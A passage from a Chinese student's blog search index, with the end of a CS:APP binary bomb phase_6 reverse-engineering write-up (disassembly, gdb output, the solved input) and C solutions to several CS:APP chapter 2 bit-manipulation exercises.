class="hljs-number">0</span>x0000000000401151 <span class="hljs-variable">&lt;+93&gt;</span>:    jmp    <span class="hljs-number">0</span>x401114 <span class="hljs-variable">&lt;phase_6+32&gt;</span><br></code></pre></td></tr></table></figure></p><p>由下面代码可以看出，对输入的6个数进行了映射，<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs input[i]">```<br>    0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx<br>    0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx<br>    0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx<br>    0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)<br>    0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax<br>    0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax<br>    0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;<br></code></pre></td></tr></table></figure></p><p>下面的代码，按照输入的6个数映射后的结果，取链表中对应的元素的6个指针放在一个数组中。<br><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0</span>x000000000040116f <span class="hljs-variable">&lt;+123&gt;</span>:   mov    <span class="hljs-variable">$0x0</span>,%esi<br> <span class="hljs-number">0</span>x0000000000401174 <span class="hljs-variable">&lt;+128&gt;</span>:   jmp    <span class="hljs-number">0</span>x401197 <span class="hljs-variable">&lt;phase_6+163&gt;</span><br> <span class="hljs-number">0</span>x0000000000401176 <span class="hljs-variable">&lt;+130&gt;</span>:   mov    <span class="hljs-number">0</span>x8(%rdx),%rdx<br> <span class="hljs-number">0</span>x000000000040117a <span class="hljs-variable">&lt;+134&gt;</span>:   add    <span class="hljs-variable">$0x1</span>,%eax<br> <span class="hljs-number">0</span>x000000000040117d <span class="hljs-variable">&lt;+137&gt;</span>:   cmp    %ecx,%eax<br> <span class="hljs-number">0</span>x000000000040117f <span class="hljs-variable">&lt;+139&gt;</span>:   jne    <span class="hljs-number">0</span>x401176 <span class="hljs-variable">&lt;phase_6+130&gt;</span><br> <span class="hljs-number">0</span>x0000000000401181 <span class="hljs-variable">&lt;+141&gt;</span>:   jmp    <span class="hljs-number">0</span>x401188 <span class="hljs-variable">&lt;phase_6+148&gt;</span><br> <span class="hljs-number">0</span>x0000000000401183 <span class="hljs-variable">&lt;+143&gt;</span>:   mov    <span class="hljs-variable">$0x6032d0</span>,%edx<br> <span class="hljs-number">0</span>x0000000000401188 <span class="hljs-variable">&lt;+148&gt;</span>:   mov    %rdx,<span class="hljs-number">0</span>x20(%rsp,%rsi,<span class="hljs-number">2</span>)<br> <span class="hljs-number">0</span>x000000000040118d <span class="hljs-variable">&lt;+153&gt;</span>:   add    <span class="hljs-variable">$0x4</span>,%rsi<br> <span class="hljs-number">0</span>x0000000000401191 <span class="hljs-variable">&lt;+157&gt;</span>:   cmp    <span class="hljs-variable">$0x18</span>,%rsi<br> <span class="hljs-number">0</span>x0000000000401195 <span class="hljs-variable">&lt;+161&gt;</span>:   je     <span class="hljs-number">0</span>x4011ab <span class="hljs-variable">&lt;phase_6+183&gt;</span><br> <span class="hljs-number">0</span>x0000000000401197 <span class="hljs-variable">&lt;+163&gt;</span>:   mov    (%rsp,%rsi,<span class="hljs-number">1</span>),%ecx<br> <span class="hljs-number">0</span>x000000000040119a <span class="hljs-variable">&lt;+166&gt;</span>:   cmp    <span class="hljs-variable">$0x1</span>,%ecx<br> <span class="hljs-number">0</span>x000000000040119d <span class="hljs-variable">&lt;+169&gt;</span>:   jle    <span class="hljs-number">0</span>x401183 <span class="hljs-variable">&lt;phase_6+143&gt;</span><br> <span class="hljs-number">0</span>x000000000040119f <span class="hljs-variable">&lt;+171&gt;</span>:   mov    <span class="hljs-variable">$0x1</span>,%eax<br> <span class="hljs-number">0</span>x00000000004011a4 <span class="hljs-variable">&lt;+176&gt;</span>:   mov    <span class="hljs-variable">$0x6032d0</span>,%edx<br> <span class="hljs-number">0</span>x00000000004011a9 <span class="hljs-variable">&lt;+181&gt;</span>:   jmp    <span class="hljs-number">0</span>x401176 <span class="hljs-variable">&lt;phase_6+130&gt;</span><br></code></pre></td></tr></table></figure></p><p>该链表头指针为$0x6032d0,查看得知该链表元素为<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs undefined">(gdb) p /x <span class="hljs-number">0x6032d0</span><br>$<span class="hljs-number">1</span> = <span class="hljs-number">0x6032d0</span><br>(gdb) p /x *<span class="hljs-number">0x6032d0</span><br>$<span class="hljs-number">2</span> = <span class="hljs-number">0x14c</span><br>(gdb) p /x *(<span class="hljs-number">0x6032d0</span> + <span class="hljs-number">8</span>)<br>$<span class="hljs-number">3</span> = <span class="hljs-number">0x6032e0</span><br>(gdb) p /x *(<span class="hljs-number">0x6032e0</span>)<br>$<span class="hljs-number">4</span> = <span class="hljs-number">0xa8</span><br>(gdb) p /x *(<span class="hljs-number">0x6032e0</span> + <span class="hljs-number">8</span>)<br>$<span class="hljs-number">5</span> = <span class="hljs-number">0x6032f0</span><br>(gdb) p /x *(<span class="hljs-number">0x6032f0</span>)<br>$<span class="hljs-number">6</span> = <span class="hljs-number">0x39c</span><br>(gdb) p /x *(<span class="hljs-number">0x6032f0</span> + <span class="hljs-number">8</span>)<br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x603300</span><br>(gdb) p /x *(<span class="hljs-number">0x603300</span>)<br>$<span class="hljs-number">8</span> = <span class="hljs-number">0x2b3</span><br>(gdb) p /x *(<span class="hljs-number">0x603300</span> + <span class="hljs-number">8</span>)<br>$<span class="hljs-number">9</span> = <span class="hljs-number">0x603310</span><br>(gdb) p /x *(<span class="hljs-number">0x603310</span>)<br>$<span class="hljs-number">10</span> = <span class="hljs-number">0x1dd</span><br>(gdb) p /x *(<span class="hljs-number">0x603310</span> + <span class="hljs-number">8</span>)<br>$<span class="hljs-number">11</span> = <span class="hljs-number">0x603320</span><br>(gdb) p /x *(<span class="hljs-number">0x603320</span>)<br>$<span class="hljs-number">12</span> = <span class="hljs-number">0x1bb</span><br>(gdb) p /x *(<span class="hljs-number">0x603320</span> + <span class="hljs-number">8</span>)<br>$<span class="hljs-number">13</span> = <span class="hljs-number">0x0</span><br></code></pre></td></tr></table></figure></p><p>之后的代码中，可以看出，用按顺序选出的节点指针，建立一个新链表，该链表为降序.<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs undefined"><span class="hljs-number">0x00000000004011ab</span> &lt;+<span class="hljs-number">183</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x20</span>(%rsp),%rbx<br><span class="hljs-number">0x00000000004011b0</span> &lt;+<span class="hljs-number">188</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x28</span>(%rsp),%rax<br><span class="hljs-number">0x00000000004011b5</span> &lt;+<span class="hljs-number">193</span>&gt;:   <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x50</span>(%rsp),%rsi<br><span class="hljs-number">0x00000000004011ba</span> &lt;+<span class="hljs-number">198</span>&gt;:   <span class="hljs-keyword">mov</span>    %rbx,%rcx<br><span class="hljs-number">0x00000000004011bd</span> &lt;+<span class="hljs-number">201</span>&gt;:   <span class="hljs-keyword">mov</span>    (%rax),%rdx<br><span class="hljs-number">0x00000000004011c0</span> &lt;+<span class="hljs-number">204</span>&gt;:   <span class="hljs-keyword">mov</span>    %rdx,<span class="hljs-number">0x8</span>(%rcx)<br><span class="hljs-number">0x00000000004011c4</span> &lt;+<span class="hljs-number">208</span>&gt;:   <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x8,%rax<br><span class="hljs-number">0x00000000004011c8</span> &lt;+<span class="hljs-number">212</span>&gt;:   <span class="hljs-keyword">cmp</span>    %rsi,%rax<br><span class="hljs-number">0x00000000004011cb</span> &lt;+<span class="hljs-number">215</span>&gt;:   <span class="hljs-keyword">je</span>     <span class="hljs-number">0x4011d2</span> &lt;phase_6+<span class="hljs-number">222</span>&gt;<br><span class="hljs-number">0x00000000004011cd</span> &lt;+<span class="hljs-number">217</span>&gt;:   <span class="hljs-keyword">mov</span>    %rdx,%rcx<br><span class="hljs-number">0x00000000004011d0</span> &lt;+<span class="hljs-number">220</span>&gt;:   <span class="hljs-keyword">jmp</span>    <span class="hljs-number">0x4011bd</span> &lt;phase_6+<span class="hljs-number">201</span>&gt;<br><span class="hljs-number">0x00000000004011d2</span> &lt;+<span class="hljs-number">222</span>&gt;:   <span class="hljs-keyword">movq</span>   <span class="hljs-number">$0</span>x0,<span class="hljs-number">0x8</span>(%rdx)<br><span class="hljs-number">0x00000000004011da</span> &lt;+<span class="hljs-number">230</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x5,%ebp<br><span class="hljs-number">0x00000000004011df</span> &lt;+<span class="hljs-number">235</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rbx),%rax<br><span class="hljs-number">0x00000000004011e3</span> &lt;+<span class="hljs-number">239</span>&gt;:   <span class="hljs-keyword">mov</span>    (%rax),%eax<br><span class="hljs-number">0x00000000004011e5</span> &lt;+<span class="hljs-number">241</span>&gt;:   <span class="hljs-keyword">cmp</span>    %eax,(%rbx)<br><span class="hljs-number">0x00000000004011e7</span> &lt;+<span class="hljs-number">243</span>&gt;:   <span class="hljs-keyword">jge</span>    <span class="hljs-number">0x4011ee</span> &lt;phase_6+<span class="hljs-number">250</span>&gt;<br><span class="hljs-number">0x00000000004011e9</span> &lt;+<span class="hljs-number">245</span>&gt;:   callq  <span class="hljs-number">0x40143a</span> &lt;explode_bomb&gt;<br><span class="hljs-number">0x00000000004011ee</span> &lt;+<span class="hljs-number">250</span>&gt;:   <span class="hljs-keyword">mov</span>    <span class="hljs-number">0x8</span>(%rbx),%rbx<br><span class="hljs-number">0x00000000004011f2</span> &lt;+<span class="hljs-number">254</span>&gt;:   <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x1,%ebp<br><span class="hljs-number">0x00000000004011f5</span> &lt;+<span class="hljs-number">257</span>&gt;:   <span class="hljs-keyword">jne</span>    <span class="hljs-number">0x4011df</span> &lt;phase_6+<span class="hljs-number">235</span>&gt;<br></code></pre></td></tr></table></figure></p><p>要使链表为降序，映射后的6个数应该为3，4，5，6，1，2，那么原输入应该为4，3，2，1，6，5</p><p>到此，二进制炸弹的解码就结束了，改实验具有一定的难度，十分考验逻辑推理和汇编理解能力.</p>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> 二进制炸弹 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CS:APP解题记录</title>
      <link href="/2018/11/08/CS:APP%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2018/11/08/CS:APP%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="CS-APP-2-60"><a href="#CS-APP-2-60" class="headerlink" title="CS:APP 2.60"></a>CS:APP 2.60</h3><a id="more"></a><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">replace_byte</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> x, <span class="hljs-keyword">int</span> i, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> b)</span><br></span>&#123;<br>    x = x &amp; (~(<span class="hljs-number">0XFF</span> &lt;&lt; (i &lt;&lt; <span class="hljs-number">3</span>)));<span class="hljs-comment">//相应字节置零</span><br>    x = x | (b &lt;&lt; (i &lt;&lt; <span class="hljs-number">3</span>));      <span class="hljs-comment">//相应字节改为char b</span><br>    <span class="hljs-keyword">return</span> x;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">unsigned</span> ret = replace_byte(<span class="hljs-number">0X12345678</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0XAB</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0X%X\n"</span>, ret);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code>0X1234AB78</code></pre><p>利用按位运算$x \&amp; 1 = x$, $b | 0 = b$。</p><h3 id="Csapp-2-65"><a href="#Csapp-2-65" class="headerlink" title="Csapp 2.65"></a>Csapp 2.65</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">odd_ones</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> x)</span><br></span>&#123;<br>    x ^= x &gt;&gt; <span class="hljs-number">16</span>;<br>    x ^= x &gt;&gt; <span class="hljs-number">8</span>;<br>    x ^= x &gt;&gt; <span class="hljs-number">4</span>;<br>    x ^= x &gt;&gt; <span class="hljs-number">2</span>;<br>    x ^= x &gt;&gt; <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> x &amp; <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">int</span> x = odd_ones(<span class="hljs-number">0XB</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, x);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code>1</code></pre><p>对32位编码，1亦或所有0仍为1，偶数个1连续亦或结果为0，奇数个1连续亦或结果为1。对32位数，按照右移16，8，4，2，1依次右移使得前后各二分之一编码对齐，亦或结果存在后二分之一编码中，直至亦或总结过存于最低位中，结束，取最低位返回。</p><h3 id="Csapp-2-67"><a href="#Csapp-2-67" class="headerlink" title="Csapp 2.67"></a>Csapp 2.67</h3><h4 id="A-在int为w位的机器中，移位长度不应该超过-w-1-。"><a href="#A-在int为w位的机器中，移位长度不应该超过-w-1-。" class="headerlink" title="A.在int为w位的机器中，移位长度不应该超过$w - 1$。"></a>A.在int为w位的机器中，移位长度不应该超过$w - 1$。</h4><h4 id="B"><a href="#B" class="headerlink" title="B"></a>B</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">int_size_is_32</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span> == INT_MIN;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, int_size_is_32());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code>1</code></pre><p>若int为32位,则$1 &lt;&lt; 31 ==$ INT_MIN.</p><h4 id="C"><a href="#C" class="headerlink" title="C"></a>C</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;limits.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">int_size_is_32_for_16</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">15</span> != INT_MIN) &amp;&amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">31</span>) == INT_MIN);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%d\n"</span>, int_size_is_32_for_16());<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code>1</code></pre><p>当$1 &lt;&lt; 15 !=$ INT_MIN，证明int非16位后，后面即可判断int是否为32位.</p><h3 id="Csapp-2-68"><a href="#Csapp-2-68" class="headerlink" title="Csapp 2.68"></a>Csapp 2.68</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">lower_one_mask</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span><br></span>&#123;<br>    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>)(<span class="hljs-number">0XFFFFFFFF</span>u &gt;&gt; (<span class="hljs-number">32</span> - n));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span><br></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"0X%X\n"</span>, lower_one_mask(<span class="hljs-number">6</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><pre><code>0X3F</code></pre><p>将无符号int最大值右移$(32 - n)$位，进行了逻辑右移，再强制转换为有符号int。</p>]]></content>
      
      
      <categories>
          
          <category> CS:APP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CS:APP </tag>
            
            <tag> 汇编 </tag>
            
            <tag> c </tag>
            
        </tags>
      
    </entry>
    
  
  
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><p>Wmc的日常学习和作业博客,记录自己成长的经历.</p>]]></content>
      
    </entry>
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
  
</search>
